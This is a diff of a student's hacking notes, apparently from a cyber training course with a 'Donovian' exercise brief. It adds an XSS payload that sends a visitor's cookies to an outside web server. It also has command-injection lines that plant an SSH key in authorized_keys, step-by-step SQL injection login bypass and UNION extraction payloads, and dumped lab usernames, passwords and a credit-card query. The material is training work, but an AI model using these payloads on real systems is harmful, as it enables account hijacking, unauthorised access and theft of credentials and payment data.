@@ -27,7 +27,7 @@ nmap --script=http-enum.nse <ip address>
 
 create web server on yourself and download cookies
 	python3 -m http.server
-	document.location="http://10.50.38.49:8000/"+document.cookie;</script>
+	<script>document.location="http://10.50.38.49:8000/"+document.cookie;</script>
 
 uploading ssh to web server
 
@@ -37,17 +37,209 @@ uploading ssh to web server
 	/var/www/.ssh/authorized_keys
 		make it if its not there already
 	; echo "your key" >> /var/www/.ssh/authorized_keys
-	ssh -i ./ssh/id_rsa www-data@<web server ip address>
+	ssh -i /.ssh/id_rsa www-data@<web server ip address>
+directory traversal
+../../../../../../../../../../../
+
+
+; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDGLL5Du5/UsLHJOQx8daDU7ChRLmemgc2DJY0jpuBnYphjDVU8t+pVSiCvp6Rvkf6X/OduA/rd/1Ha/r8ordhTgb+W3u+4KGpnQ/KkitAVODr9Lv1d4YXbO2onKxLPP1Asvl3E7N4U1+lXDnsWIVz6buftGCMqrSO86cGhiQTPdQu4wxGl/oXM4lvy+icXeBsEWqB1LUZUEYIzOhRUXyvpfaG0pT+5kCg2NKk/ae3iFEPZrxLWmlfqxKHdQ3uRCh/Q4b0TBLDjqt/QYJ2IMcJJHr5lUcGxtL1QEHY1aVsg9+nmrdbj08s1QHcmVGYBHF1c9PfnMIHPo3oNkKHLQUAQ2MmeASN6CxuBm1aK84NT3Ias5YLjuKmVxvinWR8gp/D3cf69eCg+EcLqB1PLc+l+O1HJz50lD+Ml7+8dPT98saUS0m+p3srVz6Djis6ijON/ktbtYnbSlRB5ohOFI6fKQ4azxLBWrzRYve89tNEgjgsyVbxztAGlLJMtoj3nzYW6x2DeuDc+3j5zDrARVnq21va2Ud4lPeByvgRcJvxJFoQyedLlf+52xC7TD8cALdvHV23iVI8msBnofsnTLr5RnU79k918Z3/dtoGs8JZC2AB0jfH5gGLEy2V0FfSyiH835p4UYiYGidZG9NnCUdM+862+BrCE2xo2sFvHAdT98w== student@lin-ops" > /home/billybob/.ssh/authorized_keys
+
+
+SQL Injection-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+USE
+Select the database to use**
+
+SELECT*****
+Extract data from a database
+
+UPDATE
+Update data in a database
+
+DELETE
+Delete data from a database
+
+INSERT INTO
+Insert new data into a database
+
+CREATE DATABASE
+Create a new database
+
+ALTER DATABASE
+Modify an existing database
+
+CREATE TABLE
+Create a new table
+
+ALTER TABLE
+Modify an existing table
+
+DROP TABLE
+Delete a table
+
+CREATE INDEX
+Create an index (search key)
+
+DROP INDEX
+Delete an index
+
+UNION*********
+Combine the result-set of two or more equal SELECT statements**
+
+
+mysql - gets into sql database
+show databases; - shows all databases
+	information_schema - holds all information for all other databases
+	mysql
+	performance_schema
+		all default databases
+show tables from session;
+	shows all tables from the session database
+show columns from session.Tires;
+	shows all colummns from the Tires table in the session database
+select tireid,name,size,cost from session.Tires;
+	grabs tiredid,name,size,cost and displays them
+select tireid,name,size,cost from session.Tires union select carid,name,color,cost from session.car
+	grabs all the data requested from session.Tires and session.car and displays all of them 
+	
+AUTHENTICATION BYPASS-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+post method
+tom' or 1='1
+' or 1='1
+select id from users where name='tom' or 1='1' and pass='tom' or 1='1' 
+	
+
+get method
+<URL>/login.php?username=tom' OR 1='1 & passwd=tom' OR 1='1
+do post method after using f12 to get developer console
+click network
+click correct method
+click request
+click raw
+copy paste into url like above
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+								table_schema, tables, column_name
+SQL steps
+POST METHOD
+1. Identify vulnerable field
+	Audi ' or 1='1
+2. Identify columns
+	Audi ' union select 1,2,3,4,5 #
+	will find column numbers and which are hidden to us, have to use placeholders for the ones that are hidden (2 in this case)
+3. Create golden statement
+	Audi' union select table_schema,2,table_name,column_name,5 from information_schema.columns #
+		gets all information about every database, scroll passed defaults to get user made databases,tables,columns
+4. Craft query
+	Audi' union select studentID,2,username,passwd,5 from session.userinfo #
+	Audi' union select id,2,name,pass,5 from session.user #
+	Audi' union select 1,2,name,4,5 from session.user #
+		Audi' union select name from session.user #
+			wont work, need to put the filler column mumbers as placeholders
+
+Database - session
+tables - Tires, car ,session_log, user ,userinfo
+columns (Tires) - tireid, name, size, cost
+	(car) - carid, name,tpe,cost, color, year
+	and so on.. 
+
+GET METHOD
+1. identify vulnerable field
+	put or 1=1 after selection in URL
+		http://10.50.26.140/uniondemo.php?Selection=2 or 1=1
+2. identify number of columns 
+	http://10.50.26.140/uniondemo.php?Selection=2 union select 1,2,3
+3. create golden statement
+	http://10.50.26.140/uniondemo.php?Selection=2 union select table_schema,column_name,table_name FROM information_schema.columns
+4. craft query 
+	http://10.50.26.140/uniondemo.php?Selection=2 union select id,pass,name FROM session.user
+	http://10.50.26.140/uniondemo.php?Selection=2 union select id,pass,@@version FROM session.user
+	
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+delete from comments where ID = 57;57
+
+Donovian Database Exploitation (DWDBE)
+XX Dec 2026
+Start Time: 1300
+Duration: 4 hours
+
+Type of Operation: Cyberspace Exploitation (C-E)
+
+Objective: Maneuver through network, identify and gather intelligence from the Donovian Logistics Agency database.
+
+Tools/Techniques: All connections will be established through web browser to donovian-nla. SSH masquerade to Donovian_Webserver with provide credentials. Ports in use will be dependent on target location and are subject to change. Web exploitation techniques are limited to SQLi injections. Network scanning tools/technique usage is at the discretion of student.
+
+Scenario Credentials: FLAG = 5QL1nj3ct5t@rt0F@ct1v1ty
+
+Prior Approvals: SQLi injects through web browser. Creation of database administrator account if directed to. Any connection to donovian-nla other than HTTP/HTTPs is NOT approved.
+
+Scheme of Maneuver:
+>Jump Box
+->T1:10.100.28.48
+
+Target Section:
+
+T1
+Hostname: donovian-nla
+IP: 10.100.28.48
+OS: unknown
+Creds:unknown
+Last Known SSH Port: unknown
+Last Known HTTP Port: 80
+PSP: Unknown
+Malware: Unknown
+Action: Conduct approved SQLi Exploitation techniques to collect intelligence.
+
+
+sqlinjection	id	categories
+sqlinjection	name	categories
+sqlinjection	description	categories
+sqlinjection	id	members
+sqlinjection	username	members
+sqlinjection	password	members
+sqlinjection	first_name	members
+sqlinjection	last_name	members
+sqlinjection	email	members
+sqlinjection	permission	members
+sqlinjection	id	orderlines
+sqlinjection	quantity	orderlines
+sqlinjection	product	orderlines
+sqlinjection	order	orderlines
+sqlinjection	id	orders
+sqlinjection	date	orders
+sqlinjection	member	orders
+sqlinjection	id	payments
+sqlinjection	creditcard_number	payments
+sqlinjection	date	payments
+sqlinjection	order	payments
+sqlinjection	id	permissions
+sqlinjection	level	permissions
+sqlinjection	name	permissions
+sqlinjection	description	permissions
+sqlinjection	id	products
+sqlinjection	name	products
+sqlinjection	description	products
+sqlinjection	price	products
+sqlinjection	qty_left	products
+sqlinjection	category	products
+sqlinjection	id	share4
+sqlinjection	comment	share4
+sqlinjection	mime	share4
+sqlinjection	data	share4
+
+
+1	Boss	19HXn2uhIJi7rJE9pT9v
+2	Maverick	turn&burn
+3	phreak	pwd
+4	Susan	flowers99
+5	TW	imAPlaya
+6	1-2-3-4	sayULuvM3
+7	rich_kid	1M$
+8	p0pStar	thrilla
+9	Joe	vato
+10		flag:
 
 
 
-
-
-
-
-
-
-
+ ' union select id,creditcard_number,order from sqlinjection.payments
 
 
 
